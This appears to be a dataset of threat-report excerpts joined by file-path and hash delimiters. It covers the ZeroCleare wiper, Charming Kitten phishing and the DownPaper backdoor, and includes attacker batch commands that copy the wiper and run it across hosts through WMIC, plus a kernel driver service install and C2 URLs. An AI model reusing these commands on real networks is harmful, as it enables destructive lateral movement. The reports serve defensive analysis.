This file was identified as the new wiper that was deployed in destructive attacks to damage Windows-based devices. It was named ZeroCleare by IRIS per the file path of its PDB file. As mentioned earlier in this paper, ZeroCleare relies on the legitimate EldoS RawDisk driver that was previously used in Shamoon attacks to access and wipe the hard drive directly. Using this driver, which is an inherently legitimate tool, allows ZeroCleare attackers to bypass the Windows hardware abstraction layer and avoid the OS safeguards. To install the EldoS RawDisk driver, ZeroCleare uses another binary, Soy.exe, to load the driver on the targeted device and activate it. X-Force IRIS analyzed Soy.exe and found that it is a modified version of the Turla Driver Loader (TDL), which is designed to bypass x64 Windows Driver Signature Enforcement. The TDL application works by first installing a legitimate but vulnerable, signed, VirtualBox driver, vboxdrv.sys (in this case it is named saddrv.sys). Once loaded, this vulnerable driver can be exploited to run shellcode at the kernel level, which in this case is used to load the unsigned EldoS driver. ClientUpdate.exe executes soy.exe via the following command line: cmd.exe /c soy.exe"|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|c3acca915ed84d8caa4fc20e2e34c02c
"In order to activate the disk management driver, the malware needed to open a file handle via a unique filename using the logical drive (For example, C:\). The file name's format requested by function CreateFileW must start with # followed by the license key issued to the developer by EldoS. We have observed ZeroCleare attempt to open the following filename: \\?\ElRawDisk\? ?\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d

The license key was:

b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d

It could be a temporary license key or one that was stolen from someone else. Various information stealing malware can obtain license keys from infected systems.

The ClientUpdate.exe (x64) wiping function creates a buffer of random bytes and uses function DeviceIoControl to send the buffer to the RawDisk driver to write data to the disk and wipe the victim's hard drives. Similar to what the Shamoon malware does, this would overwrite the MBR, partitions, and files on the system with random junk data. The sample was observed to contain the following PDB string: C:\Users\Developer\source\repos\ZeroCleare\x64\Release\zeroclear.pdb

Same as ClientUpdate.exe (x64), this file was also identified as the ZeroCleare wiper. As it is designed for 32-bit Windows systems, Driver Signature Enforcement does not prevent unsigned drivers from running. Therefore, this version of ZeroCleare does need to use Soy.exe or TDL, the latter being only applicable to 64-bit systems. ClientUpdate.exe (x86) first attempts to install itself as a service by running: :\windows\system32\cmd.exe /u /c sc create soydsk type= kernel start= demand binPath= [sample path]

Next, it attempts to activate the disk management device driver by opening a file handle via a unique filename using the logical drive (For example, C:\). The file name's format requested by function CreateFileW must start with # followed by the license key issued to the developer by EldoS. This 32-bit ZeroCleare version attempts to open the following filename: \\?\ElRawDisk\? ?\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf 3c911e2287a4b906d47d

The malware uses the same EldoS RawDisk driver license key as observed in the 64-bit version: b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d"|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|55b640adedcd40629042e9694c3ee4d8
"This version did not work properly. During analysis the sample crashed as the disk management driver had not been installed and was therefore not accessible. We can theorize that this may be a bug in the code. X-Force IRIS patched the 32-bit ZeroCleare sample in order to continue the analysis provided in this paper. Once it worked, we noted that this version’s wiping behavior was similar to that of ClientUpdate.exe (x64), which functioned by creating a buffer of random bytes and used the function DeviceIoControl to send the buffer to the RawDisk driver to write data that would wipe IBM Security New Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data contained on this page is subject to the restrictions at the end of this document.

The file soy.exe had a special role in the overall kill chain of ZeroCleare attacks as it was necessary for the initial bypass of Windows OS controls. This file was identified as a customized version of the Turla Driver Loader (TDL), which is a driver loader application designed for bypassing Windows x64 Driver Signature Enforcement (DSE). DSE is a protective feature that was introduced in 64-bit versions of Windows 8 and 10, to prevent the loading of drivers unsigned by Microsoft. TDL works by first loading a legitimate, Microsoft-signed, VirtualBox VBoxDrv driver. However, a vulnerable version of the driver is intentionally used, and TDL can then exploit the vulnerability to run kernel-level shellcode and ultimately load other, unsigned drivers. The file sample's resource section includes two encoded resources with the following hashes: Resource ID 1: b1ba74d92395012253b33462c67a726ff266c126f2652092c2f57659d0f46e77 Resource ID 103: 37680a5a26abc22cde99c5222881a279a04b90680231736efac1e17a8e976755"|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|20760ca7cb19446d9928aa6e876bcde8
"Before decoding the resources, soy.exe creates a mutex called Ptición de trabajo. It then attempts to access its resource section to read encoded resource 103 and uses XOR key 0XAAAAAAAAAAAAAAAA to decode it. Next, soy.exe writes the decoded content to a 64-bit file called elrawdsk.sys1. This file was identified as the 64-bit version of the EldoS RawDisk driver, version 3.0.31. After that, soy.exe attempts to access resource 1 and uses XOR key 0XFFFFFFFFFFFFFFFF to decode it. The soy.exe sample then writes the decoded content to a 64-bit VirtualBox VBoxDrv.sys driver file called saddrv.sys2, which is known to have privilege escalation and arbitrary code execution vulnerabilities. This file is a signed driver. Once the resources have been decoded, soy.exe tries to create and start a driver service with name VBoxDrv and saddrv.sys, in order to load the vulnerable VBoxDrv device driver. At this 1

1.7 Batch Scripts Used by ZeroCleare Attackers

A batch file is a script file that’s typical to DOS, OS/2 and Microsoft Windows. It consists of a series of commands to be executed by the command-line interpreter, stored in a plain text file. On devices running Windows operating systems, a batch file would store commands in serial order. ZeroCleare attackers used at least seven batch files in the attack’s flow to add functionality. 1.71 v.bat

"Batch script v.bat is designed to read a text file containing system hostnames. In this case, the file is called 'listfile.txt' although other names for this file have also been observed. For each hostname within the list, the script first copies the contents of directory ""C:\Users\$USER \Desktop\UpdateTemp"" to ""\\$hostname\c$\Windows\Temp"" and then attempts to run ""cmd /c c:\Windows\Temp\cu.bat"" using Windows Management Interface Command (WMIC), which is a simple command prompt tool that returns information about the system that’s running it. for /F ""tokens=*"" %%A in (listfile.txt) do ( xcopy /S /Y ""C:\Users\$USER\Desktop\UpdateTemp"" \\%%A\c$\Windows\Temp && wmic /node:""%%A"" process call cre ate ""cmd /c c:\Windows\Temp\cu.bat"" )

Batch files 1.bat, 2.bat, 3.bat, 4.bat, and 5.bat appear redundant as they were all identified to have the same function as v.bat. 1.72 Cu.bat Once it is run by its predecessor (v.bat), the batch script cu.bat begins by switching to the directory C:\Windows\Temp. It checks for the existence of '%PROGRAMFILES(X86)%' to determine if it is running on a 64- or 32-bit system architecture. It will change to the 'x64' directory as needed, but otherwise the switch proceeds with the 'x86' directory. Once that’s established, cu.bat runs the file .\ClientUpdate.exe, which is the ZeroCleare malware. cd c:\Windows\Temp\ IF EXIST ""%PROGRAMFILES(X86)%"" (cd .\x64) ELSE (cd .\x86) .\ClientUpdate.exe"|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|284504d95c914f90a2574326f5fe45a2
"1.8 PowerShell Scripts Used by ZeroCleare Attackers PowerShell is a task-based command-line shell and scripting language built on .NET. As such, it is part of every Windows operating system. While PowerShell is originally designed to help system administrators and power-users rapidly automate tasks that manage OS and its processes, it is also widely used by attackers that rely on ‘living off the land’ tactics. ZeroCleare attackers used some PowerShell scripts in the attack kill chain. Further detail follows. 1.81 ClientUpdate.ps1 X-Force IRIS identified two PowerShell scripts with the name ClientUpdate.ps1. The first and shorter of the two appeared to be the parent of the second and larger script.

"The first, short script,3 takes as its parameter a decryption key and defines a variable $ClientData which contains a large quantity of AES-encrypted and Base64-encoded data. The script decodes this data with the decryption key, saves it in the current directory as _ClientUpdate.ps1, and executes it using PowerShell.exe. It passes the decryption key as a parameter. It then sleeps for 5 seconds before deleting the newly created script file. We were able to identify the decryption key from system artifacts and discovered that the $ClientData variable contained the larger version of the ClientUpdate.ps1 script. The second ClientUpdate.ps1 script4 is significantly longer and more complex. The overall purpose of this script is to spread the ZeroCleare malware as far as it can across the domain. This script sets out to do that by setting up a network of master and slave (agent) systems, with each agent responsible for copying and executing the malware onto a proportion of the target (client) systems. Domain controllers were specifically chosen as agents to facilitate the spreading, and the Active Directory PowerShell module 'Get-ADComputer' cmdlet was used to assemble lists of target and client systems. The script accepts a large variety of parameters, most of which are optional with the exception of Username, Password, and Decryption key. §

"The script is multifunctional and can act in a master or slave capacity depending on the parameters originally passed to it. Master and Slave Modes The ClientUpdate.ps1 PowerShell script has two main modes of operation: 1. $Master If it is running in $Master mode, the script identifies other domain controllers, then copies and executes the script on those machines in the $Master mode. It identifies all non-DC client/target systems and begins to copy and execute the ClientUpdate.exe wiper malware on them, with the other initiated domain controllers doing the same. 2. $MasterSlave In $MasterSlave mode, one domain controller will act as the Master and identify other domain controllers to copy and run the script on them in Agent/Slave mode. The work of copying and executing the malware on the client targets is then divided up by the master and assigned to the agents, who then report back to the master on their progress. The way the script is laid out means that the same script can be used by master or agent systems with the parameters determining what function they should be performing. The main body of the script performs the following: -

First it runs the 'Update-DCGPO' function which creates a new GPO to run script ClientUpdateCore.ps1 on startup. The GPO is named ""ClietnUpdate"" (note the misspelling).

Once it has done this for all systems in $AllDC, the ClientUpdate.ps1 PowerShell script then retrieves a list of all non-DC systems using the PowerShell module Get-ADComputer. It filters out those already present on its DC list and stores them as variable $AllClient. Next, the script divides up the client list and assigns portions to each of the initialized domain controller agents. The agents work to copy and execute the ZeroCleare malware onto each of their assigned clients. There are also functions to keep track of agent workloads and the number of failed and successful clients. A client is determined to have failed if the agent cannot connect to it and create a shared folder on it. As redundancy, a swapping mechanism is in place to pass failed clients to another agent to try to infect them. These agents do not appear to check the status of the drive wiping malware itself.

"1.9 ZeroCleare: A Likely Collaboration Between Iranian State Sponsored Groups X-Force IRIS assesses that the ZeroCleare campaign included compromise and access by actors from the ITG13 group and at least one additional group, likely Iran-based threat actors. This assessment is based on ITG13's traditional mission, which has not included executing destructive cyber-attacks in the past, the gap in time between the initial access facilitated by ITG13, the last stage of the intrusion, as well as the different TTPs observed. Let’s look at the details of some of the resources used throughout the ZeroCleare attack and which can connect it with ITG13. For initial access, the IP address 193.111.152[. ]13, which was associated with ITG13 in recent Oilrig/APT34 leaks, and as also reported by Palo Alto, was used to scan target networks and access accounts as early as the Fall of 2018.6 A different Iranian threat actor likely accessed accounts from that address in mid-2019 preceding disk wiping operations. One of the IP addresses used to access compromised network accounts in mid-2019 was 194.187.249[. ]103, which is adjacent to another IP address, 194.187.249[.]102.

"xHunt).7 Additionally, while recent reporting indicates that the Russian threat actor IRIS tracks as ITG12 (aka Turla) had access to ITG13 tools and infrastructure potentially during this time frame, X-Force IRIS does not believe ITG12 was behind the ZeroCleare attack.8 During the destructive phase, ITG13 threat actors brute forced passwords to gain access to several network accounts, which were used to install the China Chopper and Tunna web shells after exploiting a SharePoint vulnerability. X-Force IRIS found an additional web shell named ""extension.aspx"", which shared similarities with the ITG13 tool known as TWOFACE/SEASHARPEE including the methods that were dynamically called from assembly, the use of AES encryption, as well as single letter variable names. The same threat actor also attempted to leverage legitimate remote access software, such as TeamViewer, and used an obfuscated version of Mimikatz to collect credentials from compromised servers. Regarding the ZeroCleare malware itself, while it shares some high-level similarities with Shamoon v3, specifically in how it used an EldoS RawDisk driver, X-Force IRIS assesses that ZeroCleare is dissimilar enough in its code and deployment mechanism to be considered distinct from the Shamoon malware family and treated as separate malware."|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|87d377fd0ebd4857ab8c6172288cad43
"While X-Force IRIS cannot attribute the activity observed during the destructive phase of the ZeroCleare campaign, we assess that high-level similarities with other Iranian threat actors, including the reliance on ASPX web shells and compromised VPN accounts, the link to ITG13 activity, and the attack aligning with Iranian objectives in the region, make it likely this attack was executed by one or more Iranian threat groups.

1.10. A New Destructive Wiper Threat in the Wild Various links inferred from examining common TTPs and indicators of compromise as mentioned in the previous section make it possible that this wiper variant was built by Iranbased nation state attackers. Recent activity from that sphere includes the “Sakabota” backdoor activity, recently reported by X-Force IRIS, also tied to ITG13 (aka “Oilrig” and “APT34”), as well as the Lyceum campaign reported by Dell-EMC SecureWorks. In these campaigns, the top targets were Kuwaiti shipping and transportation organizations.

1.11. Energy Sector in the Crosshairs Nation-state attackers have typically carried out destructive attacks against the energy sector, with historic focus especially oil and gas; however, destructive attacks can target any entity. Why has this sector been finding itself in the crosshairs of such activity? The key role oil and gas production and processing play on both the national and global level, represents a high-value target for state-sponsored adversarial actors. These types of attackers may be tasked with conducting anything from industrial espionage, to cyber kinetic attacks9 designed to disrupt the critical infrastructure of rival nations. Depending on the sophistication, scale, and frequency of attacks, cyber incidents in this space have the potential to disrupt critical services, damage or destroy highly specialized equipment, and ultimately inflict detrimental cascading effects upon global energy10 security and industries downstream.11, 12 While nation state attacks have been happening more in the past decade, it is since at least 2012 that Iranian state-sponsored threat actors have been leveraging cyber-attacks to inflict destructive, kinetic effects on their targets.13 The use of cyber-based weapons in lieu of conventional military tactics presents Iran, in this case, with a low-cost, and potentially nonattributable means of conducting hostile, and even warlike activity.|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|ee057eeab6ab4b9c8b1daa7c353d5f3e
"With attribution to one specific group becoming a challenge nowadays, working under the cyber cloak of anonymity can also allow Iran to evade sanctions and preserve its relations with international players who may support its economic and nuclear energy interests. 14 Looking at the geographical region hit by the ZeroCleare malware, it is not the first time the Middle East has seen destructive attacks target its energy sector. In addition to underpinning the economies of several Gulf nations, the Middle East petrochemical market, for example, hosts approximately 64.5% of the world’s proven oil reserves, making it a vital center of global energy architecture.15, 16 Destructive cyberattacks against energy infrastructure in this arena therefore represent a high-impact threat to both the regional and international markets.

1.12. Mitigating the Risk Posed by Destructive Malware When it comes to destructive attacks, the critical actions for security teams to take are early detection and escalation and coordinated response to contain and stop the spread. Here are some tips from our team that can help mitigate the risk of destructive malware.

1.12.1. Use threat intelligence to understand the risk to your organization Each threat actor has different motivations, capabilities, and intentions, and threat intelligence can help provide insights that increase the efficacy of an organization’s preparedness and eventual response to an incident. 1.12.2. Build effective defense-in-depth Incorporate multiple layers of security controls across the entire Cyberattack Preparation and Execution Framework.17

"Figure 3: X-Force IRIS Cyberattack Preparation and Execution Framework (Source: IBM X-Force)

1.12.3. Deploy IAM, limit privileged users, and implement MFA In most attacks, adversarial actors leverage privileged accounts to expand their foothold in compromised networks. Limit the number of those accounts to a minimum and back them up with multi-factor authentication (MFA). Also, don’t allow one accounts to access all systems.

Deploy Identity and Access Management (IAM) to apply business-process centric policies to what your users can access. That way, if their account is compromised, the attacker will have a harder time using it for access to other parts of the network. Leveraging IAM can also help baseline legitimate access and alert security teams when lateral movement could be abusing access to compromised accounts. 1.12.4. Have backups, test backups, and keep offline backups Backing up systems is a foundational best practice, but ensuring the organization has effective backups of critical systems and testing these backups is more important than ever. Being able to use backups in recovery can make a significant difference in remediating destructive malware attacks. 1.12.5. Test your response plans under pressure Use of a well-tailored tabletop exercise and a cyber range simulation can help ensure that your teams are indeed ready, on both the tactical and strategic levels, to manage a destructive malware incident. Rehearsed response plans require ongoing testing and adjustment, but they allow the IR team to carry out plans and be able to implement them effectively when the time comes to respond and remediate.

Introduction Charming Kitten is an Iranian cyberespionage group operating since approximately 2014. This report exposes their vast espionage apparatus, active during 2016-2017. We present incidents of company impersonation, made up organizations and individuals, spear phishing and watering hole attacks. We analyze their exploitation, delivery, and command-and-control infrastructure, and expose DownPaper, a malware developed by the attackers, which has not been publicly documented to date. Incidents documented in this report are likely a small fraction of the actual amount of targeted attacks, which may reach thousands of individuals. We expose more than 85 IP addresses, 240 malicious domains, hundreds of hosts, and multiple fake entities – most of which were created in 2016-2017. The most recent domains (com-archivecenter[. ]work, com-messengerservice[. ]work and com-videoservice[. ]work) were registered on December 2nd, 2017, and have probably not been used in attacks yet. We present the connection between Behzad Mesri, an Iranian national recently indicted for his involvement in hacking HBO, and Charming Kitten. We also identify other members of the group. This report refers to two likely distinct groups, Charming Kitten and Rocket Kitten, together. This is not to say that the two groups are one, but that due to overlap in infrastructure, tools, targets, and modus operandi we are unable to precisely attribute each incident to one or the other.|data_input/Oilrig_reports/entry_45dde39d-636f-46d1-8ae1-fb2bbfc469c1.text|0d7de8115b6b43228eb9439d60f9c867
"Further discussion appears in the section ""Charming Kitten or Rocket kitten?""

Targets The attackers' focus appears to be individuals of interest to Iran in the fields of Academic research (i.e. Iranists - Scholars who study Iran), Human right and media. Emphasis is given to Iranian dissidents living in Iran or abroad, and people who come in touch with Iranians or report on Iranian affairs such as journalists and reporters, media outlets covering Iran, and political advisors. Most targets known to us are individuals living in Iran, the United States, Israel, and the UK. Others live in Turkey, France, Germany, Switzerland, United Arab Emirates, India, Denmark and other countries. Notably, the attackers usually try to gain access to private email and Facebook accounts. They seek to infiltrate the targets’ social network as a hop point to breach other accounts in their social network, or to collect information about their targets. Sometimes, they aim at establishing a foothold on the target’s computer to gain access into their organization, but, based on our data, this is usually not their main objective, as opposed to other Iranian threat groups, such as Oilrig1 and CopyKittens2.

Charming Kitten or Rocket kitten? While Iranian threat actors have been well documented by security researchers, the inner workings of the ecosystem of Iran's hackers is not entirely clear. Groups can be vigorously active for years and then disappear abruptly, sometimes due to being publicly outed. Researchers make a best-faith effort to assign operations to certain groups, but the instability in the field makes the process challenging. A case of these obscure lines can be found in a blogpost published in coordination and parallel to this report -“Flying Kitten to Rocket Kitten, A Case of Ambiguity and Shared Code”3 by Collin Anderson and Claudio Guarnieri. Flying Kitten (which is another name given by the security industry to Charming Kitten) was one of the first groups to be described as a coherent threat actor conducting operations against political opponents of the IRI (Islamic Republic of Iran) government and foreign espionage targets. FireEye’s publication of “Operation Saffron Rose” report, which described Flying Kitten’s operations against aviation firms, led to the dismantling of Flying kitten's infrastructure and the apparent end of its activities. Months later, another, seemingly distinct group, “Rocket Kitten,” would be described by a series of reports."|data_input/Oilrig_reports/entry_45dde39d-636f-46d1-8ae1-fb2bbfc469c1.text|21ea09be7a424a46aa06225d9d60043b
"While the two groups exhibited different behaviors that lend credence to the assumption they were distinct, disclosures of private toolkits strongly suggest that Rocket Kitten had used Flying Kitten resources throughout its credential-theft operations. Moreover, Rocket Kitten had experimented with reusing malware that appeared to be an undisclosed precursor to Flying Kitten's “Stealer” agent documented by FireEye. These overlaps provide some indication that Rocket Kitten had some relationship to Flying Kitten – perhaps members of the latter joining the new team. Rocket Kitten has since largely subsided as a formidable actor, and repeating the theme of its predecessor now only appears in echoes of other campaigns.

The HBO hacker and Charming Kitten HBO hacking indictment In November 21, 2017, the United States Department of Justice unsealed an indictment4 against Behzad Mesri (A.K.A “Skote Vahshat”)5 for his involvement hacking and extorting HBO, and for subsequently leaking the stolen content on the Internet. Leaked content included confidential information about upcoming episodes of the popular television series, “Game of Thrones,” and video files containing unreleased episodes of other television series created by HBO6.

According to the indictment, ""Mesri is an Iran-based computer hacker who had previously worked on behalf of the Iranian military to conduct computer network attacks that targeted military systems, nuclear software systems, and Israeli infrastructure. At certain times, Mesri has been a member of an Iran-based hacking group called the Turk Black Hat security team"".

Connection to Iranian government backed threat agent Security researcher Collin Anderson of Iran Threats7 tagged Mesri's twitter account8 in a tweet9 suggesting that Mesri might be related to Charming Kitten.

"Subsequently, we tried to find connections of Mesri to other activities and people mentioned in this report. Thanks to the public nature of how Mesri and other members of Turk Black Hat conducted their hacking activities and private online life, we could find several connections. This is not to say that the HBO hack was ordered by the Iranian government. Rather, we try to strengthen the assumption that Mesri was, at a certain time, part of, or related to Charming Kitten. In addition, we unmask other members of the group based on their connection to Mesri and to Charming Kitten infrastructure.

From Mesri to Charming Kitten ArYaIeIrAN (AKA aryaieiran@gmail.com AKA aryaieiran@hotmail.com AKA mno_1988_fgh@yahoo.com) is a 29 years old Iranian hacker and member of Turk Black Hat. Below is his profile page in ""Iranian engineers club""10:

In a defacement, still online at the time of writing, both ArYaIeIrAn and Skote_Vahshat, the HBO hacker, take credit as members of Turk Black Hat. This indicates that both were members of Turk Black Hat at the same time, and likely knew each other.

Data from DomainTools whois history. Page 14 of 59 ©All rights reserved to ClearSky Cyber Security, 2017

To sum up, the HBO hacker - Behzad Mesri is a member of Turk Black Hat along with ArYaIeIrAn, who provides infrastructure for Charming Kitten activity via PersianDNS / Mahanserver together with Mohammad Rasoul Akbari, who is a Facebook friend of Behzad Mesri's. We tend to identify ArYaIeIrAn with Mohammadamin Keshvari, because the latter is the only other employee of Mahanserver and works in a company whose domain was registered by the former (and both have a similar and unique profile picture). We estimate with medium certainty that the three are directly connected to Charming Kitten, and potentially, along with others – are Charming Kitten. We used SocialNet, Shadow Dragon’s Maltego transform for social media analysis17 to analyze these connections and visually depict them, as can be seen below:

Two recent reports – ""How Iran tries to control news coverage by foreign-based journalists""18 and ""Iranian agents blackmailed BBC reporter with ‘naked photo’ threats""19 describe harassment and intimidation methods applied by Iranian intelligence agencies. These campaigns often target reporters and journalists in phishing attempts. On the same note, we identified a fake-news agency ""established"" by the attackers, called “The British news agency” or “Britishnews” (inspired by BBC)20. Its website domain is britishnews.com[. ]co and two other domains, broadcastbritishnews[. ]com and britishnews[. ]org, redirected to it.

Note the use of present perfect instead of past simple in ""has been established"" (instead of ""was established""), present progressive (we are covering) instead of present simple (we cover) to mark a habitual aspect, and ""began this work"" – all suggesting a Persian-thinking writer. This fake news-agency and accompanying social media accounts are not used to disseminate propaganda or false information. Their content was automatically copied from legitimate sources. The purpose of this news agency is to create legitimacy, with the end goal of reaching out to their targets and infecting them while visiting the infected website. The website contains BeEF (Browser Exploitation Framework – a penetration testing tool that focuses on web browsers), however it seems that the payload is sent only when the victim visits the site from IPs in a whitelist managed by the attackers. This might indicate they are after specific targets or organizations rather than widespread infection. The screenshot below shows w3school.hopto[. ]org, which served BeEF, called when britishnews.com[. ]co is loading:

Impersonating real companies United Technologies impersonation The attackers created a website impersonating UTC (United Technologies), “an American multinational conglomerate which researches, develops and manufactures products in numerous areas, including aircraft engines, [and] aerospace systems […]. UTC is a large military contractor, getting about 10% of its revenue from the U.S. government”23. The fake website was first reported by Iran Threats researchers on 6 February 201724. We do not have evidence that UTC was targeted or impacted. The fake website, which was built in January 2017, claimed to offer “Free Special Programs And Courses For Employees Of Aerospace Companies like Lockheed Martin, SNCORP, ….”. It was a decoy to make visitor download a “Flash Player”, which was in fact DownPaper malware, analyzed later in this report.

Spear Phishing for credential stealing The attackers sent hundreds, maybe thousands, of spear phishing emails to hundreds of targets. In this section, we will present samples of spear phishing emails25.

Wave 1 The attackers breached the Gmail account of Alon Gur Arye, an Israeli film producer. Alon produced a satire film about the Israeli Mossad, which potentially confused the attackers to thinking he is associated with the Israeli Mossad. The breached account was used to send a phishing email to Thamar Eilam Gindin (who is targeted by the group since 201526). Below is a screenshot of the phishing email:"|data_input/Oilrig_reports/entry_45dde39d-636f-46d1-8ae1-fb2bbfc469c1.text|1f1295d5d3a8425db5c31854935b2553
"The email contained a shortened bit.ly link to a domain registered by the attackers - drivers.documentsupportsharing[.]bid. In the statistics and usage page of the bit.ly URL we can see that the first click, likely a test run performed by the attackers before sending the phish, was from Iran.

Names of victims and targets are shared with their permission. See , Thamar Reservoir: http://www.clearskysec.com/thamar-reservoir/ Page 34 of 59 ©All rights reserved to ClearSky Cyber Security, 2017

The phishing page pretends to be a Gmail shared document downed page that requires the visitor to log in:

Page 35 of 59 ©All rights reserved to ClearSky Cyber Security, 2017

Wave 2 Sometimes the phishing email does not contain live text, but only an image of text linked to a phishing page. This is usually done to bypass text based spam filters. The attackers used WebRTC (code copied from Github27) to detect the real IP address of targets who use proxies (This method was documented by Iran Threats28):

While sending the spear phishing, the attackers preformed password recovery on the target’s Facebook account, as can be seen below. Thus, she received fake emails and legitimate ones at the same time which could cause her confusion and subsequently to give her credentials in the phishing.

Wave 3 The attackers often open a new Gmail account and send phishing emails from it. For example, suspended.user.noitification@gmail.com was used to send the following email to targets:

Which leads to:

The phishing messages were sent to hundreds of recipients from a previously unknown email address: mails.customerservices@gmail.com They contained a link to goo-gle[. ]mobi Below are screen captures of two of the messages. The content is not copied directly from Googles original notices, as evident from the spelling and grammatical errors, some of them typical of Persian speakers, e.g. using direct speech where English would use indirect speech (""that"" instead of ""whether""):

Email tracking services The attackers often use mailtrack.io to track when phishing emails are opened. These services are often used by marketing people to monitor their campaign effectiveness. Below is the source code of a spear phishing email with a mailtrack.io tracking link:

Sometimes the attackers used a similar email tracking service, by Pointofmail. In this case, the malicious email was sent from Pointofmail’s servers (this is part of their service, not due to a breach). The email contained a redirect link to legitimate address advmailservice.com:

Which redirects several times, eventually reaching the malicious page:

Targeted emails with malware Email address customers.mailservice@gmail.com was mostly used for spear phishing. Occasionally, it was used to deliver links to malware. For example, the email below linked to http://tinyurl[. ]com/hjtaeak which redirected to http://login.radio-m[.[cf/i/10-unique-chocolates-in-the-world.zip. The final URL contained the same sample of DownPaper that was hosted in the fake UTC website mentioned above (be207941ce8a5e212be8dde83d05d38d).

Note, that the person who “shared” the file with the target in the malicious email was indeed a Facebook friend of the target (the target shared a link by her a few hours prior to receiving this message), and the subject of chocolate was trending on the target's feed at the time. The attackers spied on the target (potentially by following her on various social networks), and crafted an email she would be likely to receive.

DownPaper Malware DownPaper, sometimes delivered as sami.exe, is a Backdoor trojan. Its main functionality is to download and run a second stage. The sample used in our analysis (3261d45051542ab3e54fa541f132f899) was contained in a Cabinet selfextractor (be207941ce8a5e212be8dde83d05d38d), served from the following URL: http://login.radio-m[. ]cf/utc/dnld.exe The process tree below shows dnld.exe drops sami.exe (DownPaper), which in turn runs Powershell to gain persistency:

DownPaper performs the following steps: 1. Loads from a resource file a URL of a command and control server. In the sample we analyzed, the URL was “http://46.17.97[. ]37/downloader/poster.php”, Base64 encoded as can be seen below:

2. Searches and reads the value of Window Update registry key in the following path: HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. a. If the value is Null, a new mutex is created, called Global\UpdateCenter, and a mutex synchronization function is executed. b. If the value is different than the name of the running file, section 2.a. is executed and a function called SetStartUp is called via PowerShell to create a registry key named Window Update with the following value:

MAGICHOUND.RETRIEVER By pivoting off the malicious infrastructure we found a sample of MAGICHOUND.RETRIEVER, a malware which is covered in a report by Palo Alto Networks about a group they call Magic Hound37. The report says that Magic Hound “has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia”. Also, “Link analysis of infrastructure and tools […] revealed a potential relationship between Magic Hound and the adversary group called ‘Rocket Kitten’”. The last notion is in line with our findings. MAGICHOUND.RETRIEVER is a .NET downloader that retrieves secondary payloads using an embedded URL in its configuration as the C2. Below is the sample that we found. flashplayer.exe 9d0e761f3803889dc83c180901dc7b22 ecf9b7283fda023fa37ad7fdb15be4eadded4e06 d4375a22c0f3fb36ab788c0a9d6e0479bd19f48349f6e192b10d83047a74c9d7 http://update-microsoft[. ]bid/img/WebService.asmx http://update-driversonline[. ]bid/img/WebService.asmx The connections between the sample and Charming Kitten’s infrastructure is depicted in the graph below:

As the world continues to be rocked by an unpredictable pandemic, with borders still closed, businesses struggling to stay afloat, and political confrontations becoming increasingly hostile, one thing has remained constant: The steady growth of cybercrime. For 17 years, Group-IB has dedicated its efforts to investigating cybercrime, monitoring the evolution of attackers’ tactics and instruments, and developing innovative technologies to hunt for and eliminate cyber threats. The company actively shares its insights and investigations with the expert community and general public, and this expertise culminates in the annual Group-IB Hi-Tech Crime Trends report. In their new report, Hi-Tech Crime Trends 2020-2021, Group-IB experts name the key changes that have occurred in the field of high-tech crime, revealing the inner workings of the cybercrime underground, communication between different threat groups, and affiliate programs that sell malware and other malicious services. Traditionally, Group-IB investigates not only attacks on the commercial sector but also those on critical infrastructure. The latter are typically the result of covert activities conducted by the special services of various countries around the world. Hi-Tech Crime Trends gives you access to the most complete trove of strategic data and detailed information on active cyber threats. By reading the report, you will get the answer to these burning questions: — Who are your enemies in cyberspace?|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|daa29976e79f419b8dc7c3139537732d
"— How do they operate today? — How will their toolkits adapt for future attacks? — How can you protect yourself against them? Armed with this knowledge, companies worldwide, regardless of industry, will be able to build more effective cybersecurity strategies.

The paralysis of entire economic sectors, mass transition to remote work, and widespread layoffs have led to a surge in cybercriminal activity. Threat actors have taken advantage of the unique global situation and become more creative, developing increasingly elaborate schemes to achieve their illicit goals. In the spring of 2020, Group-IB experts predicted that there would be a growth in the number of financial crimes, and cyberattacks on the computers, computer equipment (routers, web cameras), and unprotected networks of at-home workers. Those employees working in financial institutions, telecom operators, and IT companies would be the primary targets. Unfortunately, the predictions were right."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|116e059e921441259f83ece09d950b7d
"The market for Cybercrime-as-a-Service is actively developing. The phenomenon directly correlates with the renting out of computer networks that are infected with malware (botnets) and used for organizing DDoS attacks, sending phishing emails, and providing proxy servers. There have emerged new sellers of network access who form partnerships with ransomware operators and APT groups that have shifted their focus from bank theft to working with private affiliate programs. Statesponsored threat actors have likewise jumped on bandwagon, opening the doors of corporate infrastructure to ransomware. This threat has become larger than life and can no longer be ignored by any company, no matter its industry or geographic location.

During the pandemic, Group-IB analysts noticed a spike in the number of cyberattacks originating from state-sponsored threat actors and criminals using spyware, ransomware, and backdoors to exploit people’s fears and anxiety over the coronavirus. The analysts also noted that attackers actively looked for ways get into enterprise networks, a goal they achieved by infecting the computers of remote workers with malware."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|bae724d178e74bf786c2e000c0d96b02
"We are confident that with the constant exchange of information, joint efforts to maintain stability in the global cyberspace, and the creation and development of partnerships between private companies and international law enforcement agencies, we can effectively combat cybercrime. By raising the global community’s awareness of cybercrime, we can help preserve and protect the opportunities cyberspace give us.

